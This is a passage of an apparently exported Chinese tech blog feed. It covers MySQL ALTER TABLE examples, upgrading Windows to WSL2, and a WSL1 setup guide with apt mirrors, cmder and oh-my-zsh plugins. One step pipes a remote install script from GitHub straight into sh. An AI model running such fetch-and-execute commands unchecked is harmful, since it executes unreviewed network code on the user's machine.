class="operator">|</span> Field <span class="operator">|</span> Type    <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> c     <span class="operator">|</span> <span class="type">char</span>(<span class="number">1</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> i     <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="number">1000</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>你也可以使用 ALTER 命令及 DROP子句来删除字段的默认值, 如下实例:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">ALTER</span> i <span class="keyword">DROP</span> <span class="keyword">DEFAULT</span>;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> testalter_tbl;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field <span class="operator">|</span> Type    <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> c     <span class="operator">|</span> <span class="type">char</span>(<span class="number">1</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> i     <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">Changing a <span class="keyword">Table</span> Type:</span><br></pre></td></tr></table></figure><p>修改数据表类型, 可以使用 ALTER 命令及 TYPE 子句来完成。尝试以下实例, 我们将表 testalter_tbl 的类型修改为 MYISAM :</p><p>**注意:**查看数据表类型可以使用 SHOW TABLE STATUS 语句。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl ENGINE <span class="operator">=</span> MYISAM;</span><br><span class="line">mysql<span class="operator">&gt;</span>  <span class="keyword">SHOW</span> <span class="keyword">TABLE</span> STATUS <span class="keyword">LIKE</span> <span class="string">&#x27;testalter_tbl&#x27;</span>\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">           Name: testalter_tbl</span><br><span class="line">           Type: MyISAM</span><br><span class="line">     Row_format: Fixed</span><br><span class="line">           <span class="keyword">Rows</span>: <span class="number">0</span></span><br><span class="line"> Avg_row_length: <span class="number">0</span></span><br><span class="line">    Data_length: <span class="number">0</span></span><br><span class="line">Max_data_length: <span class="number">25769803775</span></span><br><span class="line">   Index_length: <span class="number">1024</span></span><br><span class="line">      Data_free: <span class="number">0</span></span><br><span class="line"> Auto_increment: <span class="keyword">NULL</span></span><br><span class="line">    Create_time: <span class="number">2007</span><span class="number">-06</span><span class="number">-03</span> <span class="number">08</span>:<span class="number">04</span>:<span class="number">36</span></span><br><span class="line">    Update_time: <span class="number">2007</span><span class="number">-06</span><span class="number">-03</span> <span class="number">08</span>:<span class="number">04</span>:<span class="number">36</span></span><br><span class="line">     Check_time: <span class="keyword">NULL</span></span><br><span class="line"> Create_options:</span><br><span class="line">        Comment:</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><hr><h2 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h2><p>如果需要修改数据表的名称, 可以在 ALTER TABLE 语句中使用 RENAME 子句来实现。</p><p>尝试以下实例将数据表 testalter_tbl 重命名为 alter_tbl:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl RENAME <span class="keyword">TO</span> alter_tbl;</span><br></pre></td></tr></table></figure><p>ALTER 命令还可以用来创建及删除MySQL数据表的索引</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更新至wsl2</title>
      <link href="/tool-wsl2/"/>
      <url>/tool-wsl2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>VMware更新了15.5.5, 支持开启了Hyper-V的 Windows 10 主机上, 因此终于可更新到WSL2了</p></blockquote><p>下表来自微软官方的比较图, 总所周知, windows是最好的linux发行版本(狗头保命)</p><table><thead><tr><th align="left">功能</th><th align="left">WSL 1</th><th align="left">WSL 2</th></tr></thead><tbody><tr><td align="left">Windows 和 Linux 之间的集成</td><td align="left">✅</td><td align="left">✅</td></tr><tr><td align="left">启动时间短</td><td align="left">✅</td><td align="left">✅</td></tr><tr><td align="left">占用的资源量少</td><td align="left">✅</td><td align="left">✅</td></tr><tr><td align="left">托管 VM</td><td align="left">❌</td><td align="left">✅</td></tr><tr><td align="left">完整的 Linux 内核</td><td align="left">❌</td><td align="left">✅</td></tr><tr><td align="left">完全的系统调用兼容性</td><td align="left">❌</td><td align="left">✅</td></tr><tr><td align="left">与 VM Ware 和 VirtualBox 一起运行</td><td align="left">✅</td><td align="left">❌</td></tr><tr><td align="left">跨 OS 文件系统的性能</td><td align="left">✅</td><td align="left">❌</td></tr></tbody></table><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><h3 id="启用“虚拟机平台”可选组件"><a href="#启用“虚拟机平台”可选组件" class="headerlink" title="启用“虚拟机平台”可选组件"></a>启用“虚拟机平台”可选组件</h3><p>安装 WSL 2 之前, 必须启用“虚拟机平台”可选功能。</p><p>以管理员身份打开 PowerShell 并运行:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure><p><strong>重新启动</strong>计算机</p><h3 id="将-WSL-2-设置为默认版本"><a href="#将-WSL-2-设置为默认版本" class="headerlink" title="将 WSL 2 设置为默认版本"></a>将 WSL 2 设置为默认版本</h3><p>安装新的 Linux 分发版时, 请在 Powershell 中运行以下命令, 以将 WSL 2 设置为默认版本:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl -<span class="literal">-set</span><span class="literal">-default</span><span class="literal">-version</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="查看已安装的子系统"><a href="#查看已安装的子系统" class="headerlink" title="查看已安装的子系统"></a>查看已安装的子系统</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">-l</span></span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">Ubuntu<span class="literal">-18</span>.<span class="number">04</span> (默认)</span><br></pre></td></tr></table></figure><h3 id="更换子系统内核"><a href="#更换子系统内核" class="headerlink" title="更换子系统内核"></a>更换子系统内核</h3><p>这里<code>Ubuntu-18.04</code>换成你的子系统名称</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl -<span class="literal">-set</span><span class="literal">-version</span> Ubuntu<span class="literal">-18</span>.<span class="number">04</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>然后等待转换</p><h3 id="查看转换"><a href="#查看转换" class="headerlink" title="查看转换"></a>查看转换</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">-l</span> <span class="literal">-v</span></span><br><span class="line">  NAME            STATE           VERSION</span><br><span class="line">* Ubuntu<span class="literal">-18</span>.<span class="number">04</span>    Running         <span class="number">2</span></span><br></pre></td></tr></table></figure><p>VERSION为2就是已完成转换</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10">https://docs.microsoft.com/zh-cn/windows/wsl/install-win10</a></p>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wsl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wsl1的安装</title>
      <link href="/tool-wsl1/"/>
      <url>/tool-wsl1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>这个其实是从老博客搬过来了, 所以其实可用直接安装wsl2</li><li>基于windows10 1909</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="1-启动Windows-Subsystem-for-Linux"><a href="#1-启动Windows-Subsystem-for-Linux" class="headerlink" title="1.启动Windows Subsystem for Linux"></a>1.启动Windows Subsystem for Linux</h3><p>开始WSL之旅的第一步是<code>启动Windows Subsystem for Linux功能</code>, 有两种方法实现:</p><h4 id="1-通过命令行"><a href="#1-通过命令行" class="headerlink" title="(1)通过命令行"></a>(1)通过命令行</h4><p>以<code>管理员</code>身份打开<code>PowerShell</code>。右键单击屏幕左下角<code>“开始”</code>菜单, 找到“Windows PowerShell(管理员)”并打开</p><p>复制以下命令并运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br></pre></td></tr></table></figure><p>安装完成后重启电脑~</p><h4 id="2-通过控制面板"><a href="#2-通过控制面板" class="headerlink" title="(2)通过控制面板"></a>(2)通过控制面板</h4><p>打开屏幕左下角“Cortana搜索框”输入“control panel”搜索并打开搜索结果中的“控制面板”</p><p>找到启用或关闭Windows功能, 如图所示, 打开“程序”——“启用或关闭Windows功能”, 找到并勾选“适用于Linux的Windows子系统”, 点击“确定”。</p><p>安装完成后重启电脑~</p><h3 id="2-通过应用商店安装Linux发行版"><a href="#2-通过应用商店安装Linux发行版" class="headerlink" title="2.通过应用商店安装Linux发行版"></a>2.通过应用商店安装Linux发行版</h3><p>打开Win10<a href="https://link.zhihu.com/?target=https://www.microsoft.com/zh-cn/store/apps/">应用商店</a>搜索你喜欢的Linux发行版并安装。目前, WSL支持<a href="https://link.zhihu.com/?target=https://www.microsoft.com/zh-cn/store/p/ubuntu/9nblggh4msv6">Ubuntu</a>, <a href="https://link.zhihu.com/?target=https://www.microsoft.com/zh-cn/store/p/kali-linux/9pkr34tncv07">Kali Linux</a>, <a href="https://link.zhihu.com/?target=https://www.microsoft.com/zh-cn/store/p/debian-gnu-linux/9msvkqc78pk6">GNU</a>, <a href="https://link.zhihu.com/?target=https://www.microsoft.com/zh-cn/store/p/opensuse-leap-42/9njvjts82tjx">OpenSUSE</a>等发行版。</p><p>以安装<code>Ubuntu</code>为例, 安装完成后搜索并打开<code>Ubuntu</code>执行后续安装。</p><p>安装完成后按提示输入默认用户名(只能小写)、密码（不会回显）。</p><p>而在这里也出现了一个问题, 我想装的东西太多了, C盘不够用咋办？软链接到非系统盘呗！</p><h2 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a><strong>迁移</strong></h2><blockquote><p>2020.5.30 不是很推荐用软链接, 毕竟可能会有各种权限问题, 当然内存空间不够又不想升内存当然值得一试</p></blockquote><p><code>mklink</code> : 本质上是一个创建链接的工具, 这里使用mklink 欺骗系统, 使系统误以为还是安装在了C盘</p><h3 id="1-定位Linux子系统的文件系统位置"><a href="#1-定位Linux子系统的文件系统位置" class="headerlink" title="1.定位Linux子系统的文件系统位置"></a><strong>1.定位Linux子系统的文件系统位置</strong></h3><p>正常是:<code>C:\Users\xxxx\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows</code>(_xxxxxxx)(xxxxx可能有也可能没有, 反正我是有(79rhkp1fndgsc))<br>直接粗暴的方法的是:先装一遍Linux子系统, 在<code>C:\Users\xxxx\AppData\Local\Packages\</code><br>下查看带有类似 CanonicalGroupLimited.UbuntuonWindows 字眼的新文件夹, 记下它的名字</p><h3 id="2-开始迁移"><a href="#2-开始迁移" class="headerlink" title="2.开始迁移"></a><strong>2.开始迁移</strong></h3><h4 id="1-先卸载Linux子系统"><a href="#1-先卸载Linux子系统" class="headerlink" title="(1)先卸载Linux子系统"></a><strong>(1)先卸载Linux子系统</strong></h4><p>卸载的原因在于Linux子系统下的文件系统的权限更改十分复杂, 这里面的一些文件不属于Windows下的管理员用户所有, 也不属于你的用户, 它就是Linux下用户所有的, 使用一般的修改权限文件方法很容易出问题。因此还是推荐先备份后再卸载。</p><h4 id="2-创建软链接"><a href="#2-创建软链接" class="headerlink" title="(2)创建软链接"></a><strong>(2)创建软链接</strong></h4><p>使用管理员打开<code>cmd</code>, 输入下面的命令:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; mklink /j C:\Users\XXXX\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc  D:\WSL-ubuntu\</span><br></pre></td></tr></table></figure><p><code>D:\WSL-ubuntu\</code>即非系统盘的位置</p><h4 id="3-创建成功后再打开应用商店-安装Linux子系统"><a href="#3-创建成功后再打开应用商店-安装Linux子系统" class="headerlink" title="(3)创建成功后再打开应用商店, 安装Linux子系统"></a>(3)<strong>创建成功后再打开应用商店, 安装Linux子系统</strong></h4><h4 id="4-问题！"><a href="#4-问题！" class="headerlink" title="(4)问题！"></a>(4)<strong>问题！</strong></h4><p>在这里我花了很长的时间查文档寻求解决方法, 结果都是些简单问题0.0….</p><h5 id="问题1-出现子系统无法安装-错误代码0x80070005"><a href="#问题1-出现子系统无法安装-错误代码0x80070005" class="headerlink" title="问题1: 出现子系统无法安装, 错误代码0x80070005"></a><strong>问题1</strong>: 出现子系统无法安装, 错误代码0x80070005</h5><p>问题出现在文件权限上。解决方法:</p><p>对着你非系统盘的储存文件夹, 右键-&gt;属性-&gt;安全-&gt;编辑-&gt;设置完全控制, 即可解决。</p><p>或:icacls D:\WSL-ubuntu\ /grant “你的用户名:(OI)(CI)(F)”</p><h5 id="问题2-安装启动子系统后-卡在installing"><a href="#问题2-安装启动子系统后-卡在installing" class="headerlink" title="问题2:安装启动子系统后, 卡在installing"></a>问题2:安装启动子系统后, 卡在installing</h5><p>这里问题出现在LxssManager服务上。</p><p><em>Lxss Manager 服务支持运行本机 ELF 二进制文件。该服务提供在 Windows 上运行 ELF 二进制文件所需的基础结构。如果停止或禁用该服务, 这些二进制文件将不再运行。</em></p><p>解决方法:重启电脑-&gt;此电脑-&gt;右键-&gt;管理-&gt;服务-&gt;找到<em>LxssManager</em>-&gt;启动</p><h3 id="迁移总结"><a href="#迁移总结" class="headerlink" title="迁移总结"></a>迁移总结</h3><p>同样的道理, 使用 <code>mklink</code> 工具可以将其他大文件迁移到非系统盘后再创造软链接, 用于减小C盘负担是很不错的。接下来开始折腾优化0.0…</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="1-更换apt源"><a href="#1-更换apt源" class="headerlink" title="1.更换apt源"></a>1.更换apt源</h3><p>因为Linux子系统的apt源使用的是官方源, 需要连接到国外的服务器。所以安装一些软件时下载会很慢, 我们可以改用国内的镜像apt源。<br> <a href="https://mirror.alibaba.com/ubuntu">https://mirror.alibaba.com/ubuntu</a> 阿里的镜像站</p><blockquote><p>注意看版本代号, Ubuntu每个版本的代号都不一样！</p></blockquote><p>ubuntu 18.04(bionic) 配置如下:</p><pre><code>deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</code></pre><p>先进行一下备份。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>选择一个源添加到文件最前面或直接替换掉原文件。<br>[Ctrl+o 写入 Ctrl+x 退出 Ctrl+k 删除整行, 大概就用到这仨吧]</p><p>保存后运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudp apt-get upgrade</span><br></pre></td></tr></table></figure><h3 id="2-终端的美化"><a href="#2-终端的美化" class="headerlink" title="2.终端的美化"></a>2.终端的美化</h3><blockquote><p>2020.5.30 可直接上windows terminal了, 自带的比较香</p></blockquote><p>win10下可有、丑了。推荐大家一个开源软件cmder, 可以完美解决这一问题。这个软件同样可以在<a href="https://cmder.net/">官网</a>上下载到, 而且是免安装。选择下载mini版即可, 因为bash我们已经有了嘛！</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/2019040919033478.png" alt="wsl"></p><p>贴张我修改后的图0.0, 是不是好看很多。</p><p>打开cmder直接进入的是cmd, 我们可以在设置中更改它的startup方式, 选择command line , 填入<code>bash -cur_console:p</code>。<br> 保存设置, 下次打开时就直接进入Linux子系统了。</p><p>还可以在colors选项中选择自己喜欢的主题, 在transparency中更改主界面的透明度。<br> 而且cmder还有分屏功能。这些功能请自行发掘0.0</p><h3 id="3-便捷打开方式"><a href="#3-便捷打开方式" class="headerlink" title="3.便捷打开方式"></a>3.便捷打开方式</h3><p>我们可以将cmder添加进win10的环境变量中, 这样我们就可以像在Linux系统中那样, 在任意文件目录下直接右键打开cmder并进入当前路径了。<br> 比如在桌面点击右键, 选择cmder here, 这样打开cmder就可以直接进入桌面的路径了。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20190614160707.png" alt="20190614160707"></p><p>设置环境变量的具体方法是, 依次进入控制面板-&gt;系统和安全-&gt;系统-&gt;高级-&gt;环境变量-&gt;编辑系统环境变量Path-&gt;新建-&gt;把cmder路径添加进来, 保存之后就可以用win+R的方式打开cmder了。</p><p>接下来, 以管理员方式打开cmd, 输入命令<code>Cmder.exe /REGISTER ALL</code>。之后就可以直接在右键中打开cmder了！</p><h3 id="4-安装zsh和on-my-zsh"><a href="#4-安装zsh和on-my-zsh" class="headerlink" title="4.安装zsh和on-my-zsh"></a>4.安装zsh和on-my-zsh</h3><p>shell的类型有很多种, linux下默认的是bash, 虽然bash的功能已经很强大, 但对于以懒惰为美德的程序员来说, bash的提示功能不够强大, 界面也不够炫, 并非理想工具。</p><p>而zsh的功能极其强大, 只是配置过于复杂, 起初只有极客才在用。后来, 有个穷极无聊的程序员可能是实在看不下去广大猿友一直只能使用单调的bash, 于是他创建了一个名为<code>oh-my-zsh</code>的开源项目, then, 我这种蒟蒻也能用上zsh了。</p><p>(1)安装zsh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo aptitude update</span><br><span class="line">sudo aptitude install zsh</span><br></pre></td></tr></table></figure><p>（2）设<code>zsh</code>为默认shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure><p>（3）全自动安装on-my-zsh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br></pre></td></tr></table></figure><h4 id="zsh主题"><a href="#zsh主题" class="headerlink" title="zsh主题"></a>zsh主题</h4><p>通过如下命令可以查看可用的<code>Theme</code>:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls ~/.oh-my-zsh/themes</span><br></pre></td></tr></table></figure><p>如何修改zsh主题呢？<br>编辑<code>~/.zshrc</code>文件, 将<code>ZSH_THEME=&quot;candy&quot;</code>, 将candy修改为你需想要的主题。</p><p>但由于主题没有显示完整路径, 要做以下修改(以robbyrussell)为例:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano ~/.oh-my-zsh/themes/robbyrussell.zsh-theme</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/wsl-theme.png" alt="wsl-theme"></p><p>%c修改为[$PWD]</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/wsl-theme2.png" alt="wsl-theme2"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><p>重启即可显示完整路径</p><h4 id="zsh扩展"><a href="#zsh扩展" class="headerlink" title="zsh扩展"></a>zsh扩展</h4><p>在<code>~/.zshrc</code>中找到<code>plugins</code>关键字, 就可以自定义启用的插件了, 系统默认加载<code>git</code>。</p><h5 id="git插件"><a href="#git插件" class="headerlink" title="git插件"></a>git插件</h5><p>命令内容可以参考<code>cat ~/.oh-my-zsh/plugins/git/git.plugin.zsh</code>。</p><p>常用的:</p><table><thead><tr><th align="center">简写</th><th align="center">完整</th></tr></thead><tbody><tr><td align="center">gapa</td><td align="center">git add –patch</td></tr><tr><td align="center">gc!</td><td align="center">git commit -v –amend</td></tr><tr><td align="center">gcl</td><td align="center">git clone –recursive</td></tr><tr><td align="center">gclean</td><td align="center">git reset –hard &amp;&amp; git clean -dfx</td></tr><tr><td align="center">gcm</td><td align="center">git checkout master</td></tr><tr><td align="center">gcmsg</td><td align="center">git commit -m</td></tr><tr><td align="center">gco</td><td align="center">git checkout</td></tr><tr><td align="center">gd</td><td align="center">git diff</td></tr><tr><td align="center">gdca</td><td align="center">git diff –cached</td></tr><tr><td align="center">gp</td><td align="center">git push</td></tr><tr><td align="center">grbc</td><td align="center">git rebase –continue</td></tr><tr><td align="center">gst</td><td align="center">git status</td></tr><tr><td align="center">gup</td><td align="center">git pull –rebase</td></tr></tbody></table><p>完整列表:<code>https://github.com/robbyrussell/oh-my-zsh/wiki/Plugin:git</code></p><h5 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h5><p>解压文件用的, 所有的压缩文件, 都可以直接<code>x filename</code>, 不用记忆参数</p><p>当然, 如果你想要用<code>tar</code>命令, 可以使用<code>tar -</code>加<code>tab</code>键, zsh会列出参数的含义。</p><h5 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a>autojump</h5><p>按照<a href="https://github.com/wting/autojump">官方文档</a>介绍, 需要用如下命令安装:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/wting/autojump</span><br><span class="line"><span class="built_in">cd</span> autojump</span><br><span class="line">./install.py or ./uninstall.py</span><br></pre></td></tr></table></figure><p>安装好之后, 需要在<code>~/.zshrc</code>中配置一下, 在末尾添加一行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[[ -s /root/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; <span class="built_in">source</span> /root/.autojump/etc/profile.d/autojump.sh</span><br></pre></td></tr></table></figure><p>安装好之后, 记得<code>source ~/.zshrc</code>, 然后你就可以通过<code>j+目录名</code>快速进行目录跳转。支持目录名的模糊匹配和自动补全。</p><ul><li><code>j -stat</code>:可以查看历史路径库</li></ul><h5 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a>zsh-autosuggestions</h5><p><a href="https://github.com/zsh-users/zsh-autosuggestions">zsh-autosuggestions</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>在 <code>~/.zshrc</code> 中配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(其他的插件 zsh-autosuggestions)</span><br></pre></td></tr></table></figure><p>因为箭头<code>→</code>不太方便, 在<code>.zshrc</code>中自定义补全快捷键为逗号, 但是又一次遇到了需要输入逗号的情况, 所以, 并不太推荐如下修改:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;, &#x27;</span> autosuggest-accept</span><br></pre></td></tr></table></figure><h5 id="zsh-syntax-highlighting"><a href="#zsh-syntax-highlighting" class="headerlink" title="zsh-syntax-highlighting"></a>zsh-syntax-highlighting</h5><p><a href="https://github.com/zsh-users/zsh-syntax-highlighting">zsh-syntax-highlighting</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure><p><code>~/.zshrc</code>文件中配置:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(其他的插件 zsh-syntax-highlighting)</span><br></pre></td></tr></table></figure><h5 id="git-open"><a href="#git-open" class="headerlink" title="git-open"></a>git-open</h5><p><a href="https://github.com/paulirish/git-open">git-open</a>插件可以在你git项目下打开远程仓库浏览项目。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/paulirish/git-open.git <span class="variable">$ZSH_CUSTOM</span>/plugins/git-open</span><br></pre></td></tr></table></figure><h5 id="bat"><a href="#bat" class="headerlink" title="bat"></a>bat</h5><p><code>bat</code> 代替 <code>cat</code><br><code>cat</code> 某个文件, 可以在终端直接输出文件内容, <code>bat</code> 相比 <code>cat</code> 增加了行号和颜色高亮</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/sharkdp/bat/releases/download/v0.11.0/bat_0.11.0_amd64.deb</span><br><span class="line">dpkg -i bat_0.11.0_amd64.deb</span><br></pre></td></tr></table></figure><p>版本号可去<a href="https://github.com/sharkdp/bat/releases">https://github.com/sharkdp/bat/releases</a>自行查看0.0</p><h3 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h3><ul><li>命令历史记录<ul><li>一旦在 shell 敲入正确命令并能执行后, shell 就会存储你所敲入命令的历史记录（存放在<code>~/.zsh_history</code> 文件中）, 方便再次运行之前的命令。可以按方向键↑和↓来查看之前执行过的命令</li><li>可以用 <code>r</code>来执行上一条命令</li><li>使用 <code>ctrl-r</code> 来搜索命令历史记录</li></ul></li><li>命令别名<ul><li>可以简化命令输入, 在 <code>.zshrc</code> 中添加 <code>alias shortcut=&#39;this is the origin command&#39;</code> 一行就相当于添加了别名</li><li>在命令行中输入 <code>alias</code> 可以查看所有的命令别名</li></ul></li></ul><h3 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h3><ul><li>连按两次Tab会列出所有的补全列表并直接开始选择, 补全项可以使用 ctrl+n/p/f/b上下左右切换</li><li>智能跳转, 安装了 autojump 之后, zsh 